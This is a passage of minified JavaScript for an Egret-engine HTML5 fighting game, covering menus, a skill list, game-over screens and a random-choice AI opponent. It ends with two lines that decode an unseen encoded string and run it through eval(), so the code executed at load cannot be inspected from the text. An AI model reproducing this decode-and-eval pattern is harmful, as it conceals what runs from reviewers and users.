        var b = new Login_2;
        this.addChild(b);
        window.cb_start();
    };
    d.prototype.in_three_game = function () {
        this.removeChildren();
        var b = new Login_3;
        this.addChild(b);
        window.cb_start();
    };
    d.prototype.in_four_game = function () {
        this.removeChildren();
        var b = new Login_4;
        this.addChild(b);
        window.cb_start();
    };
    d.prototype.in_five_game =
        function () {
            this.removeChildren();
            var b = new Login_5;
            this.addChild(b);
            window.cb_start();
        };
    return d
}(egret.DisplayObjectContainer);
Select.prototype.__class__ = "Select";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Skill = function (c) {
    function d() {
        c.call(this);
        var b = Common.c_door_bg();
        this.addChild(b);
        b = Common.c_mask();
        this.addChild(b);
        RES.getResAsync("description", this.get_res, this)
    }

    __extends(d, c);
    d.prototype.get_res = function () {
        this.res = RES.getRes("description");
        var b = new egret.Sprite;
        b.width = 540 * Main.sFactor;
        b.height = 948 * Main.sFactor;
        b.y = 94 * Main.sFactor;
        b.x = Main.stageW / 2 - b.width / 2;
        var a = new egret.Shape;
        a.graphics.beginFill(16777215, 0.8);
        a.graphics.drawRoundRect(0, 0, b.width, b.height, 20);
        a.graphics.endFill();
        b.addChild(a);
        for (a = 0; 8 > a; a++) {
            var c = this.skills(a);
            b.addChild(c);
            var d = new egret.TextField;
            d.text = this.res[a][0].text;
            d._fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
            d.size = 24 * Main.sFactor;
            d.textColor = 0;
            d.x = c.x + 0.8 * c.width + 30;
            d.y = c.y + 0.3 * c.height;
            b.addChild(d)
        }
        this.addChild(b);
        b = Common.c_back();
        b.y = 64 * Main.sFactor;
        b.x = 1 == Main.sFactor ? 0.9 * Main.stageW -
        b.width / 2 : 0.903 * Main.stageW - b.width;
        b.touchEnabled = !0;
        b.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.back_home, this);
        this.addChild(b)
    };
    d.prototype.back_home = function (b) {
        b = b._currentTarget;
        b.touchEnabled = !1;
        b.removeEventListener(egret.TouchEvent.TOUCH_BEGIN, this.back_home, this);
        this.removeChildren();
        b = new Start;
        this.addChild(b)
    };
    d.prototype.skills = function (b) {
        var a = new egret.Bitmap;
        a.texture = RES.getRes(this.res[b][1].icon);
        a.x = 20 * Main.sFactor;
        a.y = 0 < b ? 20 * (b + 1) * Main.sFactor + b * a.height * 0.8 : 20 * Main.sFactor +
        b * a.height * 0.8;
        a.scaleX = a.scaleY = 0.8;
        return a
    };
    return d
}(egret.DisplayObjectContainer);
Skill.prototype.__class__ = "Skill";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Start = function (c) {
    function d() {
        c.call(this);
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStart, this)
    }

    __extends(d, c);
    d.prototype.onLoadStart = function () {
        this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStart, this);
        var b = new egret.Bitmap;
        b.texture = RES.getRes("start_bg");
        b.width = Main.stageW;
        b.height = Main.stageH;
        this.addChild(b);
        b = Common.c_name();
        b.x = Main.stageW / 2 - b.width / 2;
        b.y = 64 * Main.sFactor;
        this.addChild(b);
        this.draw_button("start", 746, "\u5f00\u59cb\u6e38\u620f", this.onLoadGame);
        this.draw_button("select", 866, "\u9009\u62e9\u5173\u5361", this.onLoadSelect);
        this.draw_button("look", 986, "\u67e5\u770b\u62db\u5f0f", this.onLoadLook)
    };
    d.prototype.onLoadGame = function () {
        this.removeChildren();
        var b = new Login;
        this.addChild(b);
        window.cb_start()
    };
    d.prototype.onLoadSelect = function () {
        this.removeChildren();
        var b = new Select;
        this.addChild(b)
    };
    d.prototype.onLoadLook = function () {
        this.removeChildren();
        var b = new Skill;
        this.addChild(b)
    };
    d.prototype.draw_button = function (b, a, c, d) {
        var n = new egret.Sprite;
        n.width = 400 * Main.sFactor;
        n.height = 100 * Main.sFactor;
        n.x = Main.stageW / 2 - n.width / 2;
        n.y = a * Main.sFactor;
        n.touchEnabled = !0;
        n.addEventListener(egret.TouchEvent.TOUCH_BEGIN, d, this);
        b = new egret.Shape;
        b.graphics.lineStyle(4, 16777215);
        b.graphics.beginFill(3355443, 1);
        b.graphics.drawRoundRect(0, 0, 400 * Main.sFactor, 100 * Main.sFactor, 16);
        b.graphics.endFill();
        n.addChild(b);
        b = new egret.TextField;
        b.text = c;
        b.width = 400 * Main.sFactor;
        b.fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
        b.bold = !0;
        b.size = 48 * Main.sFactor;
        b.textAlign = "center";
        b.y = 25 * Main.sFactor;
        n.addChild(b);
        this.addChild(n)
    };
    return d
}(egret.DisplayObjectContainer);
Start.prototype.__class__ = "Start";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Main = function (c) {
    function d() {
        c.call(this);
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onAddToStage, this);
        window.shit = this.shit;
        window.context = this
    }

    __extends(d, c);
    d.prototype.onAddToStage = function (b) {
        RES.addEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigComplete, this);
        /iPhone/i.test(navigator.userAgent) ? (RES.loadConfig("resource/resource.json",
            window.resourceCDN + "resource/"), d.sFactor = 1) : (RES.loadConfig("resource/assets/320/resource.json", window.resourceCDN + "resource/assets/320/"), d.sFactor = 0.5)
    };
    d.prototype.onConfigComplete = function (b) {
        RES.removeEventListener(RES.ResourceEvent.CONFIG_COMPLETE, this.onConfigComplete, this);
        RES.addEventListener(RES.ResourceEvent.GROUP_COMPLETE, this.onResourceLoadComplete, this);
        RES.loadGroup("preload")
    };
    d.prototype.onResourceLoadComplete = function (b) {
        "preload" == b.groupName && (RES.removeEventListener(RES.ResourceEvent.GROUP_COMPLETE,
            this.onResourceLoadComplete, this), d.stageW = this.stage.stageWidth, d.stageH = this.stage.stageHeight, d.fuckyou = 0, window.loading.finish(), this.createGameScene(), window.cb_finishload())
    };
    d.prototype.createGameScene = function () {
        var b = new Start;
        this.addChild(b)
    };
    d.prototype.shit = function () {
        this.removeChildren();
        this.createGameScene()
    };
    return d
}(egret.DisplayObjectContainer);
Main.prototype.__class__ = "Main";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Common = function (c) {
    function d() {
        c.call(this)
    }

    __extends(d, c);
    d.c_name = function () {
        var b = new egret.Bitmap;
        b.texture = RES.getRes("title");
        return b
    };
    d.c_door_bg = function () {
        var b = new egret.Bitmap;
        b.texture = RES.getRes("door");
        b.width = Main.stageW;
        b.height = Main.stageH;
        return b
    };
    d.c_mask = function () {
        var b = new egret.Shape;
        b.graphics.beginFill(0,
            0.6);
        b.graphics.drawRect(0, 0, Main.stageW, Main.stageH);
        b.graphics.endFill();
        return b
    };
    d.c_back = function () {
        var b = new egret.Bitmap;
        b.texture = RES.getRes("btn_home");
        return b
    };
    d.c_random = function (b, a) {
        return Math.ceil(a + Math.random() * (b - a)) - 1
    };
    return d
}(egret.DisplayObjectContainer);
Common.prototype.__class__ = "Common";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Over = function (c) {
    function d(b) {
        c.call(this);
        var a = new egret.Bitmap;
        a.texture = RES.getRes("start_bg");
        a.width = Main.stageW;
        a.height = Main.stageH;
        this.addChild(a);
        a = Common.c_mask();
        this.addChild(a);
        this.show_spite();
        a = new egret.Bitmap;
        a.texture = RES.getRes(b);
        a.x = Main.stageW / 2 - a.width / 2;
        a.y = 228 * Main.sFactor;
        this.addChild(a);
        b = Common.c_back();
        b.y = 64 * Main.sFactor;
        b.x = 536 * Main.sFactor;
        b.touchEnabled = !0;
        b.addEventListener(egret.TouchEvent.TOUCH_BEGIN, this.back_home, this);
        this.addChild(b);
        window.cb_gameover(Main.fuckyou)
    }

    __extends(d, c);
    d.prototype.back_home = function (b) {
        b = b._currentTarget;
        b.touchEnabled = !1;
        b.removeEventListener(egret.TouchEvent.TOUCH_BEGIN, this.back_home, this);
        this.removeChildren();
        b = new Start;
        this.addChild(b)
    };
    d.prototype.show_spite = function () {
        var b = new egret.Sprite;
        b.width = 480 * Main.sFactor;
        b.height = 520 * Main.sFactor;
        b.x = Main.stageW /
        2 - b.width / 2;
        b.y = 310 * Main.sFactor;
        var a = new egret.Shape;
        a.graphics.beginFill(16777215, 1);
        a.graphics.drawRoundRect(0, 0, 480 * Main.sFactor, 520 * Main.sFactor, 20);
        a.graphics.endFill();
        b.addChild(a);
        if (1 == window.haveShare && !window.haveGamelist) {
            var a = this.draw_button("next", 77, 90, "\u6311\u6218\u4e0b\u4e00\u4e2a", this.onLoadSelect, 15419465), c = this.draw_button("reset", 77, 190, "\u91cd\u65b0\u6311\u6218", this.resetGame, 1682137), d = this.draw_button("share", 77, 290, "\u5206\u4eab\u6218\u7ee9", this.show_share, 2862924);
            b.addChild(a);
            b.addChild(c);
            b.addChild(d)
        }
        1 == window.haveShare && 1 == window.haveGamelist && (a = this.draw_button("next", 77, 90, "\u6311\u6218\u4e0b\u4e00\u4e2a", this.onLoadSelect, 15419465), c = this.draw_button("reset", 77, 190, "\u91cd\u65b0\u6311\u6218", this.resetGame, 1682137), d = this.draw_button("share", 77, 290, "\u5206\u4eab\u6218\u7ee9", this.show_share, 2862924), b.addChild(a), b.addChild(c), b.addChild(d));
        window.haveShare || 1 != window.haveGamelist || (a = this.draw_button("next", 77, 90, "\u6311\u6218\u4e0b\u4e00\u4e2a",
            this.onLoadSelect, 15419465), c = this.draw_button("reset", 77, 190, "\u91cd\u65b0\u6311\u6218", this.resetGame, 1682137), d = this.draw_button("more", 77, 290, "\u66f4\u591a\u6e38\u620f", this.more_game, 6710886), b.addChild(a), b.addChild(c), b.addChild(d));
        window.haveShare || window.haveGamelist || (a = this.draw_button("next", 77, 90, "\u6311\u6218\u4e0b\u4e00\u4e2a", this.onLoadSelect, 15419465), c = this.draw_button("reset", 77, 190, "\u91cd\u65b0\u6311\u6218", this.resetGame, 1682137), b.addChild(a), b.addChild(c));
        this.addChild(b)
    };
    d.prototype.onLoadSelect = function () {
        this.removeChildren();
        var b = new Select;
        this.addChild(b)
    };
    d.prototype.resetGame = function () {
        this.removeChildren();
        var b = new Start;
        this.addChild(b);
        window.cb_restart()
    };
    d.prototype.show_share = function () {
        window.cb_share();
    };
    d.prototype.close = function (b) {
        b.target.touchEnabled = !1;
        this.sharePopup.visible = !1
    };
    d.prototype.more_game = function () {
        window.cb_more()
    };
    d.prototype.draw_button = function (b, a, c, d, n, h) {
        var f = new egret.Sprite;
        f.width =
            326 * Main.sFactor;
        f.height = 80 * Main.sFactor;
        f.x = a * Main.sFactor;
        f.y = c * Main.sFactor;
        f.touchEnabled = !0;
        f.addEventListener(egret.TouchEvent.TOUCH_BEGIN, n, this);
        b = new egret.Shape;
        b.graphics.beginFill(h, 1);
        b.graphics.drawRoundRect(0, 0, f.width, f.height, 10);
        b.graphics.endFill();
        f.addChild(b);
        b = new egret.TextField;
        b.text = d;
        b.width = 326 * Main.sFactor;
        b.fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
        b.bold = !0;
        b.size = 34 * Main.sFactor;
        b.textColor = 16777215;
        b.textAlign = "center";
        b.y = 20 * Main.sFactor;
        f.addChild(b);
        return f
    };
    return d
}(egret.DisplayObjectContainer);
Over.prototype.__class__ = "Over";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Prompt = function (c) {
    function d() {
        c.call(this);
        this.prompt = new egret.TextField;
        this.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f...";
        this.prompt.fontFamily = "\u5fae\u8f6f\u96c5\u9ed1";
        this.prompt.size = 38 * Main.sFactor;
        this.prompt.textColor = 15537243;
        this.prompt.anchorX = 0.5;
        this.prompt.x = Main.stageW / 2;
        this.prompt.y = 700 * Main.sFactor;
        return this.prompt
    }

    __extends(d, c);
    return d
}(egret.DisplayObjectContainer);
Prompt.prototype.__class__ = "Prompt";
var __extends = this.__extends || function (c, d) {
        function b() {
            this.constructor = c
        }

        for (var a in d)d.hasOwnProperty(a) && (c[a] = d[a]);
        b.prototype = d.prototype;
        c.prototype = new b
    }, Login = function (c) {
    function d() {
        c.call(this);
        this.first_bout = this.global_bout = !0;
        this.second_bout = !1;
        this.sign = 0;
        this.second_Tap = this.enough_vigour = this.enough_thunder = this.enough_sickle = this.enough_blackDragon = this.enough_qiQ = this.enough_senior = this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool =
            this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.symbol = 2;
        this.addEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this)
    }

    __extends(d, c);
    d.prototype.onLoadStage = function () {
        this.removeEventListener(egret.Event.ADDED_TO_STAGE, this.onLoadStage, this);
        var b = RES.getRes("player_json"), a = RES.getRes("player_png");
        this.mcFactory = new egret.MovieClipDataFactory(b, a);
        this.player = new egret.MovieClip(this.mcFactory.generateMovieClipData("stand"));
        this.player.x = 20 * Main.sFactor + this.player.width /
        2 * Main.sFactor;
        this.player.y = 538 * Main.sFactor + this.player.height / 2 * Main.sFactor;
        this.player.scaleX = this.player.scaleY = Main.sFactor;
        b = RES.getRes("boss_1_json");
        a = RES.getRes("boss_1_png");
        this.AiFactory = new egret.MovieClipDataFactory(b, a);
        this.Ai_player = new egret.MovieClip(this.AiFactory.generateMovieClipData("stand"));
        this.Ai_player.x = 0.88 * Main.stageW;
        this.Ai_player.y = 538 * Main.sFactor + this.Ai_player.height / 2 * Main.sFactor;
        this.Ai_player.scaleX = this.Ai_player.scaleY = Main.sFactor;
        this.addChild(this.Ai_player);
        this.addChild(this.player);
        this.prompt = new Prompt;
        this.addChild(this.prompt);
        this.stage.addEventListener(egret.Event.ENTER_FRAME, this.onEnterFrame, this)
    };
    d.prototype.getProbability = function (b, a) {
        switch (a) {
            case 2:
                this.second(b);
                break;
            case 3:
                this.three(b);
                break;
            case 4:
                this.second(b);
                break;
            case 5:
                this.five(b);
                break;
            default:
                this.second(b)
        }
    };
    d.prototype.outcome_1 = function () {
        this.base_block_Bool || this.qi_gong_Bool || (this.storage_Bool ? this.loser() : this.senior_block_Bool ? this.enough_senior && this.loser() :
            this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_2 = function () {
        this.base_block_Bool || this.qi_gong_Bool || this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool &&
        this.enough_blackDragon && this.winner())
    };
    d.prototype.outcome_3 = function () {
        this.base_block_Bool || (this.qi_gong_Bool ? this.enough_qiQ && this.winner() : this.storage_Bool || this.senior_block_Bool || (this.sickle_Bool ? this.enough_sickle && this.winner() : this.vigour_Bool ? this.enough_vigour && this.winner() : this.thunder_Bool ? this.enough_thunder && this.winner() : this.black_dragon_Bool && this.enough_blackDragon && this.winner()))
    };
    d.prototype.allot = function () {
        Common.c_random(0, 2) ? this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block") :
            (this.power_point_r.text = this.player_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"));
        this.Ai_player.play()
    };
    d.prototype.second = function (b) {
        7 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : 8 == b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3()) : 0 > this.Ai_power() - 1 ? (this.power_point_r.text =
            "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1())
    };
    d.prototype.three = function (b) {
        4 > b ? 0 > this.Ai_power() - 1 ? (this.power_point_r.text = "0", this.allot()) : (this.power_point_r.text = this.Ai_power() - 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("Qigong"), this.Ai_player.play(), this.outcome_1()) : 7 > b ? (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData =
            this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(), this.outcome_3()) : (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2())
    };
    d.prototype.five = function (b) {
        7 >= b ? (this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("base_block"), this.Ai_player.play(), this.outcome_2()) : (this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play(),
            this.outcome_3())
    };
    d.prototype.loser = function () {
        var b = this;
        Main.fuckyou = 0;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text = "\u60a8\u5931\u8d25\u4e86...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("fail");
                b.addChild(a)
            })
        })
    };
    d.prototype.winner = function () {
        var b = this;
        Main.fuckyou = 1;
        egret.Tween.get(this).wait(1E3).call(function () {
            b.prompt.text = "\u60a8\u6218\u80dc\u4e86\u5bf9\u624b...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            egret.Tween.get(b).wait(1E3).call(function () {
                b.removeChildren();
                var a = new Over("success");
                b.addChild(a);
                ih5game.storage.get("secondAi") || ih5game.storage.set("secondAi", "true")
            })
        })
    };
    d.prototype.onEnterFrame = function () {
        var b = this;
        if (this.second_bout && this.second_Tap) {
            this.second_Tap = this.second_bout = !1;
            var a = Common.c_random(0, 10);
            this.getProbability(a, this.symbol);
            this.symbol++;
            egret.Tween.get(this).wait(1500).call(function () {
                b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
                b.Ai_player.play()
            })
        }
    };
    d.prototype.log = function () {
        var b = this;
        this.prompt.visible || (this.prompt.visible = !0);
        this.prompt.text = "Power\u4e0d\u8db3...";
        egret.Tween.get(this.prompt).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f...";
            for (var a = 0; 8 > a; a++)b.skill_arr[a].touchEnabled = !0;
            b.global_bout = !0;
            b.player.movieClipData = b.mcFactory.generateMovieClipData("stand");
            b.player.play();
            b.Ai_player.movieClipData = b.AiFactory.generateMovieClipData("stand");
            b.Ai_player.play();
            b.storage_Bool = !1;
            b.base_block_Bool = !1;
            b.senior_block_Bool = !1;
            b.qi_gong_Bool = !1;
            b.black_dragon_Bool = !1;
            b.sickle_Bool = !1;
            b.thunder_Bool = !1;
            b.vigour_Bool = !1
        })
    };
    d.prototype.triggerBaseBlock = function () {
        var b = this;
        this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u57fa\u7840\u683c\u6321...";
        this.player.movieClipData = this.mcFactory.generateMovieClipData("base_block");
        this.player.play();
        this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"),
            this.Ai_player.play()) : this.second_bout || (this.second_bout = !0);
        egret.Tween.get(this.prompt).wait(1500).call(function () {
            b.backToStand();
            1 != b.sign || b.second_bout || (b.second_bout = !0)
        })
    };
    d.prototype.backToStand = function () {
        for (var b = this, a = 0; 8 > a; a++)this.skill_arr[a].touchEnabled = !0;
        this.vigour_Bool = this.thunder_Bool = this.sickle_Bool = this.black_dragon_Bool = this.qi_gong_Bool = this.senior_block_Bool = this.base_block_Bool = this.storage_Bool = !1;
        this.global_bout = !0;
        this.player.movieClipData = this.mcFactory.generateMovieClipData("stand");
        this.player.play();
        this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("stand");
        this.Ai_player.play();
        egret.Tween.get(this).wait(500).call(function () {
            b.prompt.text = "\u8bf7\u9009\u62e9\u62db\u5f0f..."
        })
    };
    d.prototype.judge = function () {
        this.first_bout || this.second_bout || (this.second_bout = !0)
    };
    d.prototype.addPower = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.storage_Bool = !0;
        this.global_bout && (this.prompt.visible || (this.prompt.visible = !0), this.global_bout = !1, this.prompt.text = "\u50a8\u5b58\u80fd\u91cf\u4e2d...", this.power_point_l.text = this.player_power() + 1 + "", this.player.movieClipData = this.mcFactory.generateMovieClipData("storage"), this.player.play(), this.first_bout ? (this.first_bout = !1, this.sign = 1, this.power_point_r.text = this.Ai_power() + 1 + "", this.Ai_player.movieClipData = this.AiFactory.generateMovieClipData("storage"), this.Ai_player.play()) : (this.second_bout || (this.second_bout = !0), this.second_bout && (this.second_Tap = !0)), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.global_bout = !0;
            a.backToStand();
            1 != a.sign || a.second_bout || (a.second_bout = !0)
        }))
    };
    d.prototype.base_block = function (b) {
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.base_block_Bool = !0;
        this.judge();
        this.second_bout && (this.second_Tap = !0);
        this.global_bout && (this.global_bout = !1, this.triggerBaseBlock())
    };
    d.prototype.senior_block = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.senior_block_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_senior = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ad8\u7ea7\u683c\u6321...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("senior_block"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_senior = !1, this.log())
    };
    d.prototype.QiGong = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.qi_gong_Bool = !0;
        this.judge();
        1 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_qiQ = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u6c14\u529f\u6ce2...", this.power_point_l.text = this.minus(1), this.player.movieClipData = this.mcFactory.generateMovieClipData("Qigong"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_qiQ = !1, this.log())
    };
    d.prototype.black_dragon = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.black_dragon_Bool = !0;
        this.judge();
        3 <= this.player_power() ? (this.second_bout &&
        (this.second_Tap = !0), this.enough_blackDragon = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9ed1\u9f99\u529f...", this.power_point_l.text = this.minus(3), this.player.movieClipData = this.mcFactory.generateMovieClipData("black_dragon"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_blackDragon = !1, this.log())
    };
    d.prototype.sickle = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.sickle_Bool = !0;
        this.judge();
        4 <= this.player_power() ?
            (this.second_bout && (this.second_Tap = !0), this.enough_sickle = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u9570\u5200\u65a9...", this.power_point_l.text = this.minus(4), this.player.movieClipData = this.mcFactory.generateMovieClipData("sickle"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
                a.backToStand()
            })) : (this.enough_sickle = !1, this.log())
    };
    d.prototype.thunder = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.thunder_Bool = !0;
        this.judge();
        5 <= this.player_power() ?
            (this.second_bout && (this.second_Tap = !0), this.enough_thunder = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u96f7\u5f39...", this.power_point_l.text = this.minus(5), this.player.movieClipData = this.mcFactory.generateMovieClipData("mine"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
                a.backToStand()
            })) : (this.enough_thunder = this.second_Tap = !1, this.log())
    };
    d.prototype.vigour = function (b) {
        var a = this;
        for (b = 0; 8 > b; b++)this.skill_arr[b].touchEnabled = !1;
        this.vigour_Bool = !0;
        this.judge();
        8 <= this.player_power() ? (this.second_bout && (this.second_Tap = !0), this.enough_vigour = !0, this.prompt.text = "\u4f60\u4f7f\u7528\u4e86\u5143\u6c14\u5f39...", this.power_point_l.text = this.minus(8), this.player.movieClipData = this.mcFactory.generateMovieClipData("vigour"), this.player.play(), egret.Tween.get(this.prompt).wait(1500).call(function () {
            a.backToStand()
        })) : (this.enough_vigour = !1, this.log())
    };
    d.prototype.player_power = function () {
        return parseInt(this.power_point_l.text)
    };
    d.prototype.Ai_power = function () {
        return parseInt(this.power_point_r.text)
    };
    d.prototype.minus = function (b) {
        return parseInt(this.power_point_l.text) - b + ""
    };
    return d
}(Game);
Login.prototype.__class__ = "Login";
var resultde = aperture.encrypt.SimpleEncode.decode(JSON.parse(hhh));
eval(resultde);